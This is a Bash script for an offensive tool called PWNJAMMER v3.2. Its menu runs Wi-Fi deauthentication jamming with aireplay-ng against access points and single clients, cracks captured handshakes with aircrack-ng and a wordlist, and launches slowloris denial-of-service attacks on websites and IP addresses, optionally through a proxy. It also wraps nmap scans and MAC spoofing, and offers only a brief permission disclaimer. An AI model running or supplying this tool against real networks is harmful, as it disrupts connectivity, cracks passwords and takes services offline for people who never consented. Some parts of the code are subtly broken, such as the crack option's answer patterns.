####################################################################

banner()
{ 
    clear
    f_toolscheck
    printf "\e[92m     *              *\n"
    printf "\e[92m   *    *\e[91m  \e[92m      *    *\n"
    printf "\e[92m  *   *   \e[91m (\e[94m*\e[91m) \e[92m   *    *\e[93m               PWNJAMMER\n"
    printf "\e[92m   *   *\e[91m    | \e[92m   *    *\e[94m\e[93m                  v3.2\n"
    printf "\e[92m     *      \e[91m|\e[92m      *\e[95m     http://github.com/rkhunt3r/pwnjammer3\n"
    printf "\e[91m            |\n"
    printf "\e[91m           /!\ \n"
}

####################################################################

menu()
{
    banner
    printf "\e[0m===============================================================\n"
    printf "\n"
    printf "\e[96m(1) START JAMMING SINGLE WI-FI\n"
    printf "\e[96m(2) START JAMMING SINGLE WI-FI CLIENT\n"
    printf "\e[96m(3) SCAN FOR WI-FI\n"
    printf "\e[96m(4) SCAN FOR WI-FI CLIENTS\n"
    printf "\e[96m(5) CRACK CAPTURE FILE\n"
    printf "\e[96m(6) SCAN NETWORK\n"
    printf "\e[96m(7) SCAN IP FOR OPEN PORTS\n"
    printf "\e[96m(8) SCAN IP FOR OS INFO\n"
    printf "\e[96m(9) DDOS WEBSITE\n"
    printf "\e[96m(10) DDOS IP ADDRES\n"
    printf "\e[96m(11) TRACEROUTE SITE\n"
    printf "\e[96m(12) ENABLE MONITOR MODE\n"
    printf "\e[96m(13) CHANGE MAC ADDRES\n"
    printf "\e[96m(14) SETTINGS\n"
    printf "\e[96m(15) EXIT\n"
    printf "\n"
    read -p "OPTION: " menu
    case $menu in
    
    1) f_ap ;;
    
    2) f_cli ;;
    
    3) f_apscan ;;
    
    4) f_cliscan ;;
    
    5) f_crack ;;
    
    6) f_network ;;
    
    7) f_nmap ;;
    
    8) f_nmapos ;;
    
    9) f_websiteddos ;;
    
    10) f_ipddos ;;
    
    11) f_pod ;;
    
    12) f_mmode ;;
    
    13) f_mac ;;
    
    14) f_settings ;;
    
    15) echo " "; echo "EXITING..."; sleep 0.8;break; clear ;;
    
    *) menu 
    esac
}

####################################################################

f_ap()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "TARGET WI-FI BSSID: " bssid
    printf "\n"
    read -p "INTERFACE TO PERFROM ATTACK: " iface
    printf "\n"
    read -r -p "PERFORM ATTACK? (y/n): " response
    printf "\n"
    case $response in
        [yY][eE][sS]|[yY])
           printf "PWNJAMMER3 STARTING ATTACK ON $bssid"
           sleep 1
           printf "\n"
           aireplay-ng -0 0 -a $bssid $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_ap
        ;;
    esac
}

####################################################################

f_cli()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "TARGET WI-FI BSSID: " bssid
    printf "\n"
    read -p "TARGET CLIENT BSSID: " cli
    printf "\n"
    read -p "INTERFACE TO PERFORM ATTACK: " iface
    printf "\n"
    read -r -p "PERFORM ATTACK? (y/n): " response
    printf "\n"
    case $response in
        [yY][eE][sS]|[yY])
            aireplay-ng -0 0 -b $bssid -c $cli $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_cli
        ;;
    esac
}

####################################################################

f_apscan()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "SAVE LOGS TO FILE? (y/n): " save
    printf "\n"
    case $save in
        [yY][eE][sS]|[yY])
            f_apscany
            ;;
        [nN][oO]|[nN])
            f_apscann
            ;;
        *)
        f_apscan
        ;;
    esac
}

####################################################################

f_apscany()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "INTERFACE TO PERFORM SCAN: " iface
    printf "\n"
    printf "I SAVE LOGS IN:\n" 
    pwd
    printf "\n"
    read -p "NAME FOR CAPTURE: " cap
    printf "\n"
    read -r -p "SCAN? (y/n): " response
    case $response in
        [yY][eE][sS]|[yY])
            airodump-ng -w $cap --output-format csv $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_apscany
        ;;
    esac
}

####################################################################

f_apscann()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "INTERFACE TO PERFORM SCAN: " iface
    printf "\n"
    read -r -p "SCAN? (y/n): " response
    case $response in
        [yY][eE][sS]|[yY])
            airodump-ng $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_apscany
        ;;
    esac
}

####################################################################

f_cliscany()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "INTERFACE TO PERFORM SCAN: " iface
    printf "\n"
    printf "I SAVE LOGS IN:\n" 
    pwd
    printf "\n"
    read -p "NAME FOR CAPTURE: " cap
    printf "\n"
    read -p "TARGET WI-FI BSSID: " bssid
    printf "\n"
    read -p "SCAN? (y/n): " resp
    printf "\n"
    case $resp in
        [yY][eE][sS]|[yY])
            airodump-ng --bssid $bssid -w $cap --output-format csv $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_cliscann
        ;;
    esac
}

####################################################################

f_cliscan()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "SAVE LOGS TO FILE? (y/n): " save
    printf "\n"
    case $save in
        [yY][eE][sS]|[yY])
            f_cliscany
            ;;
        [nN][oO]|[nN])
            f_cliscann
            ;;
        *)
        f_apscan
        ;;
    esac
}

####################################################################

f_cliscann()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "INTERFACE TO PERFORM SCAN: " iface
    printf "\n"
    read -p "TARGET WI-FI BSSID: " bssid
    printf "\n"
    read -p "SCAN? (y/n): " resp
    printf "\n"
    case $resp in
        [yY][eE][sS]|[yY])
            airodump-ng --bssid $bssid $iface
            ;;
        [nN][oO]|[nN])
            menu
            ;;
        *)
        f_cliscany
        ;;
    esac
}

####################################################################

f_mmode()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "INTERFACE TO MONITOR MODE: " iface
    printf "\n"
    read -p "CHANNEL (OPTIONAL): " channel
    printf "\n"
    read -p "ENABLE MONITOR MODE ON $iface? (y/n): " mmode
    case $mmode in
        [yY][eE][sS]|[yY])
            airmon-ng start $iface $channel
            printf "\n"
            printf "\e[92m"
            printf "ENABLED MONITOR MODE!"
            sleep 2
            menu
            ;;
        [nN][oO]|[nO])
            menu
            ;;
        *)
        f_mmode
        ;;
    esac
}

####################################################################

f_mac()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "INTERFACE FOR MAC CHANGE: " mac
    printf "\n"
    read -p "SET (R)ANDOM, (C)USTOM OR RE(S)ET MAC?: " rc
    case $rc in
        [cC][uU][sS][tT][oO][mM]|[cC])
            printf "\n"
            read -p "CUSTOM MAC FOR $mac: " custom
            printf "\n"
            ifconfig $mac down
            macchanger --mac $custom $mac
            ifconfig $mac up
            printf "\n"
            printf "\e[92m MAC CHANGED!"
            sleep 2
            menu
            ;;
        [rR][aA][nN][dD][oO][mM]|[rR])
            printf "\n"
            ifconfig $mac down
            macchanger --random $mac
            ifconfig $iface up
            printf "\n"
            printf "\e[92m MAC CHANGED!"
            sleep 2
            menu
            ;;
        [rR][eE][sS][eE][tT]|[sS])
            printf "\n"
            ifconfig $mac down
            macchanger -p $mac
            ifconfig $mac
            printf "\n"
            printf "\e[92m MAC CHANGED!"
            sleep 2
            menu
            ;;
        *)
        f_mac
        ;;
    esac
}

####################################################################

f_settings()
{
    banner
    printf "\e[0m===============================================================\n"
    printf "\e[96m"
    printf "(1) INSTALL DEPENDENCIES\n"
    printf "(2) CHECK INTERNET SPEED\n"
    printf "(3) REMOVE PWNJAMMER3\n"
    printf "(4) BACK TO MENU\n"
    printf "\n"
    read -p "OPTION: " settings
    case $settings in
    
    1) f_install ;;
    
    2) f_ispeed ;;
    
    3) f_removelist ;;
    
    4) menu ;;
    
    *) f_settings
    esac
}

####################################################################

f_install()
{
    banner
    printf "\n"
    printf "\e[93m"
    read -p "INSTALL DEPRNDENCIES? (y/n): " install
    case $install in
        [yY][eE][sS]|[yY])
            f_instally
            ;;
        [nN][oO]|[nN])
            f_settings
            ;;
        *)
        f_install
        ;;
    esac
}

####################################################################

f_instally()
{
    banner
    printf "\e[93m"
    printf "\n"

progress()
{
  printf "\e[92mINSTALLING DEPENDENCIES, THIs CAN TAKE A WHILE... WAIT!\n"
  printf "\e[94m["
  while true
  do
    printf "\e[93m#"
    sleep 0.6
  done
}

dobackup()
{
    apt update >/dev/null 2>&1
    apt install speedtest-cli -y >/dev/null 2>&1
    apt-get install python3-pip -y >/dev/null 2>&1
    apt-get install aircrack-ng -y >/dev/null 2>&1
    apt-get install macchanger -y >/dev/null 2>&1
    apt-get install netdiscover -y >/dev/null 2>&1
    apt-get install nmap -y >/dev/null 2>&1
    apt-get install speedtest-cli -yv>/dev/null 2>&1
    pip2 install slowloris >/dev/null 2>&1
    pip3 install slowloris >/dev/null 2>&1
    pip install slowloris >/dev/null 2>&1
    apt-get install traceroute -y >/dev/null 2>&1
}

progress & 


MYSELF=$!

dobackup

kill $MYSELF > /dev/null 2>&1

printf "\e[94m]"
printf "\n\e[92mDONE!\n"
sleep 1.5
f_settings
}

####################################################################

f_ispeed()
{
    banner
    printf "\n"
    printf "\e[93m"
    printf "WAIT FOR INTERNET SPEED TEST COMPLETE!!!"
    printf "\n"
    speedtest-cli
    printf "\n"
    printf "\e[92m"
    read -p "PRESS [ENTER] TO BACK..." variable
    printf "\e[96"
    menu
}

####################################################################

f_remove()
{
    banner
    printf "\n"
    printf "\e[91m"
    read -p "ARE YOUR SURE? (YES/n): " sure
    case $sure in
        [Y][E][S])
            f_uninstall
            ;;
        [nN][oO]|[nN])
            f_settings
            ;;
        *)
        f_remove
        ;;
    esac
}

####################################################################

f_quickuninstall()
{
    banner
    printf "\e[91m"
    printf "\n"
    read -p "ENTER PWNJAMMER3 FOLDER (/root/pwnjammer3 etc.): " fol
    printf "\n"

progress()
{
  printf "\e[91mREMOVING PWNJAMMER3... WAIT!\n"
  printf "\e[94m["
  while true
  do
    printf "\e[93m#"
    sleep 0.5
  done
}

dobackup()
{
    rm -r -f $fol >/dev/null 2>&1
    sleep 2 >/dev/null 2>&1
}

progress & 


MYSELF=$!

dobackup

kill $MYSELF > /dev/null 2>&1

printf "\e[94m]"
printf "\n\e[92mDONE!\n"
sleep 1.5
clear
break
}

####################################################################

f_crack()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "CAPTURED FILE: " capfile
    printf "\n"
    read -p "PASSWORD LIST: " passfile
    printf "\n"
    read -p "CRACK $capfile? (y/n): " crack
    case $crack in
        [yY][eE][sS][yY])
            aircrack-ng $capfile -w $passfile
            printf "\n"
            sleep 4
            menu
            ;;
        [nN][oO][nN])
            menu
            ;;
        *)
          f_crack
          ;;
    esac
            
}

####################################################################

f_network()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "INTERNET CONNECTED INTERFACE: " iiface
    printf "\n"
    netdiscover -i $iiface
    printf "\n"
    menu
}

####################################################################

f_nmap()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "SAVE LOGS TO FILE? (y/n): " save
    case $save in
        [yY][eE][sS]|[yY])
            printf "\n"
            read -p "NAME FOR LOGS: " name
            printf "\n"
            printf "I SAVE LOGS IN: "
            pwd
            printf "\n"
            read -p "IP ADDRES TO SCAN: " IP
            printf "\n"
            nmap -oN $name $IP
            printf "\n"
            printf "\e[92m"
            read -p "PRESS [ENTER] TO BACK..." variable
            menu
            ;;
        [nN][oO]|[nN])
            printf "\n"
            read -p "IP ADDRES TO SCAN: " IP
            printf "\n"
            nmap $IP
            printf "\n"
            printf "\e[92m"
            read -p "PRESS [ENTER] TO BACK..." variable
            menu
            ;;
        *)
        f_nmap
        ;;
    esac
}

####################################################################

f_nmapos()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "SAVE LOGS TO FILE? (y/n)" logs
    case $logs in
        [yY][eE][sS]|[yY])
            printf "\n"
            read -p "NAME FOR LOGS: " name
            printf "\n"
            printf "I SAVE LOGS IN: "
            pwd
            printf "\n"
            read -p "IP ADDRES TO SCAN: " IP
            printf "\n"
            nmap -oN $name -O --osscan-guess --fuzzy $IP
            printf "\n"
            printf "\e[92m"
            read -p "PRESS [ENTER] TO BACK..." variable
            menu
            ;;
        [nN][oO]|[oO])
            printf "\n"
            read -p "IP ADDRES TO SCAN: " IP
            printf "\n"
            nmap -O --osscan-guess --fuzzy $IP
            printf "\n"
            printf "\e[92m"
            read -p "PRESS [ENTER] TO BACK..."
            menu
            ;;
        *)
        f_nmapos
        ;;
    esac
}

####################################################################

f_websiteddos()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "USE A PROXY? (y/n): " save
    printf "\n"
    case $save in
        [yY][eE][sS]|[yY])
            read -p "PROXY HOST: " HOST
            printf "\n"
            read -p "PROXY PORT: " PORTT
            printf "\n"
            read -p "WEBSITE ADDRES: " addres
            printf "\n"
            read -p "WEBSITE PORT (80): " port
            printf "\n"
            read -p "SOCKETS (150): " socket
            printf "\n"
            printf "\e[92mSTARTING ATTACK!!!"
            sleep 1
            printf "\e[93m"
            printf "\n"
            slowloris --proxy-host $HOST --proxy-port $PORTT -p $port -s $socket $addres --sleeptime 2 -v
            read -p "PRESS [ENTER] TO BACK..."
            printf "\e[96m"
            menu
            ;;
        [nN][oO]|[nN])
            read -p "WEBSITE ADDRES: " addres
            printf "\n"
            read -p "WEBSITE PORT (80): " port
            printf "\n"
            read -p "SOCKETS (150): " socket
            printf "\n"
            printf "\e[92mSTARTING ATTACK!!!"
            sleep 1
            printf "\e[93m"
            printf "\n"
            slowloris -p $port -s $socket $addres --sleeptime 2 -v
            read -p "PRESS [ENTER] TO BACK..."
            printf "\e[96m"
            menu
            ;;
        *)
        f_apscan
        ;;
    esac
   
}

####################################################################

f_pod()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "WEBSITE, IP TO ATTACK: : " ip
    printf "\n"
    read -p "PORT: " data
    printf "\n"
    printf "\e[92m"
    printf "STARTTING ATTACK!!!"
    printf "\n"
    sleep 1
    printf "\e[93m"
    printf "\n"
    traceroute $ip -p $data -r -v
    sleep 2
    menu
}

####################################################################

f_ipddos()
{
    banner
    printf "\e[93m"
    printf "\n"
    read -p "USE A PROXY? (y/n): " save
    printf "\n"
    case $save in
        [yY][eE][sS]|[yY])
            read -p "PROXY HOST: " HOST
            printf "\n"
            read -p "PROXY PORT: " PORTT
            printf "\n"
            read -p "IP ADDRES: " addres
            printf "\n"
            read -p "SOCKETS (150): " socket
            printf "\n"
            printf "\e[92mSTARTING ATTACK!!!"
            sleep 1
            printf "\e[93m"
            printf "\n"
            slowloris --proxy-host $HOST --proxy-port $PORTT -s $socket $addres --sleeptime 2 -v
            read -p "PRESS [ENTER] TO BACK..." variable
            printf "\e[96m"
            menu
            ;;
        [nN][oO]|[nN])
            read -p "IP ADDRES: " addres
            printf "\n"
            read -p "SOCKETS (150): " socket
            printf "\n"
            printf "\e[92mSTARTING ATTACK!!!"
            sleep 1
            printf "\e[93m"
            printf "\n"
            slowloris -s $socket $addres --sleeptime 2 -v
            read -p "PRESS [ENTER] TO BACK..." variable
            printf "\e[96m"
            menu
            ;;
        *)
        f_apscan
        ;;
    esac

}

####################################################################

f_toolscheck()
{
    command -v aircrack-ng >/dev/null 2>&1 || { echo >&2 "\e[91mAIRCRACK-NG SUITE NOT FOUND! INSTALL DEPENDENCIES IN SETTINGS... "; }
    command -v netdiscover >/dev/null 2>&1 || { echo >&2 "\e[91mNETDISCOVER NOT FOUND! INSTALL DEPENDENCIES IN SETTINGS... "; }
    command -v macchanger >/dev/null 2>&1 || { echo >&2 "\e[91mMACCHANGER NOT FOUND! INSTALL DEPENDENCIES IN SETTINGS... "; }
    command -v slowloris >/dev/null 2>&1 || { echo >&2 "\e[91mSLOWLORIS NOT FOUND! INSTALL DEPENDENCIES IN SETTINGS..."; }
    command -v traceroute >/dev/null 2>&1 || { echo >&2 "\e[91mTRACEROUTE NOT FOUND! INSTALL DEPENDENCIES IN SETTINGS... "; }
    command -v speedtest-cli >/dev/null 2>&1 || { echo >&2 "\e[91mSPEEDTEST-CLI NOT FOUND! INSTALL DEPENDENCIES IN SETTINGS... "; }
    command -v nmap >/dev/null 2>&1 || { echo >&2 "\e[91mNMAP NOT FOUND! INSTALL DEPENDENCIES IN SETTINGS... "; }
}

####################################################################

f_removelist()
{
    banner
    printf "\n"
    printf "\e[0m===============================================================\n"
    printf "\n"
    printf "\e[93m*************\e[96mQUICK UNINSTALL\e[93m**************\n"
    printf "\e[93mTHIS REMOVE ONLY PWNJAMMER3 SCRIPT FOLDER,\n"
    printf "\e[93mNOT DEPENDENCIES \e[92m(RECOMMEND!!!)\n"
    printf "\e[93m******************************************\n"
    printf "\n"
    printf "\e[91m**************\e[96mFULL UNINSTALL\e[91m**************\n"
    printf "\e[91mTHIS REMOVE PWNJAMMER SCRIPT FOLDER, AND\n"
    printf "\e[91mALL DEPENDENCIES - AIRCRACK-NG SUITE,\n"
    printf "\e[91mNMAP, SLOWLORIS, MACCHANGER, NETDISCOVER,\n"
    printf "\e[91mSPEDDTEST-CLI, TRACEROUTE...\e[31m(NOT RECOMEND)\n"
    printf "\e[91m******************************************\n"
    printf "\n"
    printf "\e[95m"
    read -p "[B]ACK, [Q]UICK OR [F]ULL UNINSTALL?: " QuestOfLife
    case $QuestOfLife in
        [Q][U][I][C][K]|[Q])
            f_quickuninstall
            ;;
        [F][U][L][L]|[F])
            f_fulluninstall
            ;;
        [B][A][C][K]|[B])
            f_settings
            ;;
        *)
        f_removelist
        ;;
    esac
}

####################################################################

f_warning()
{
    clear
    printf "\e[92m###################\e[91mWARNING!\e[92m###################\n"
    printf "\e[96m     PWNJAMMER3 IS \e[91mNOT \e[96mFOR STUPID USAGE.\n"
    printf "\e[96mIF YOU WANT JAMMING WI-FI ASK FOR PERMISSION...\n"
    printf "\e[96m     IM \e[91mNOT \e[96mRESPONSIBLE FOR ANY THINKS.\n"
    printf "\e[93m              HAPPY WI-FI JAMMING!\n"
    printf "\e[92m##############################################\n"
    sleep 4
    
    
}

####################################################################

f_fulluninstall()
{
    banner
    printf "\e[91m"
    printf "\n"
    read -p "ENTER PWNJAMMER3 FOLDER (/root/pwnjammer3 etc.): " fol
    printf "\n"

progress()
{
  printf "\e[91mREMOVING PWNJAMMER3... WAIT!\n"
  printf "\e[94m["
  while true
  do
    printf "\e[93m#"
    sleep 1
  done
}

dobackup()
{
    apt-get remove speedtest-cli -y >/dev/null 2>&1
    apt-get remove python3-pip -y >/dev/null 2>&1
    apt-get remove aircrack-ng -y >/dev/null 2>&1
    apt-get remove macchanger -y >/dev/null 2>&1
    apt-get remove netdiscover -y >/dev/null 2>&1
    apt-get remove nmap -y >/dev/null 2>&1
    apt-get remove speedtest-cli -yv>/dev/null 2>&1
    pip2 uninstall slowloris -y >/dev/null 2>&1
    pip3 uninstall slowloris -y >/dev/null 2>&1
    pip uninstall slowloris -y >/dev/null 2>&1
    apt-get remove traceroute -y >/dev/null 2>&1
    rm -r -f $fol >/dev/null 2>&1
    sleep 2 >/dev/null 2>&1
}

progress & 


MYSELF=$!

dobackup

kill $MYSELF > /dev/null 2>&1

printf "\e[94m]"
printf "\n\e[92mDONE!\n"
sleep 1.5
clear
break
}

####################################################################

###RUN_PROGRAM!###
f_warning
menu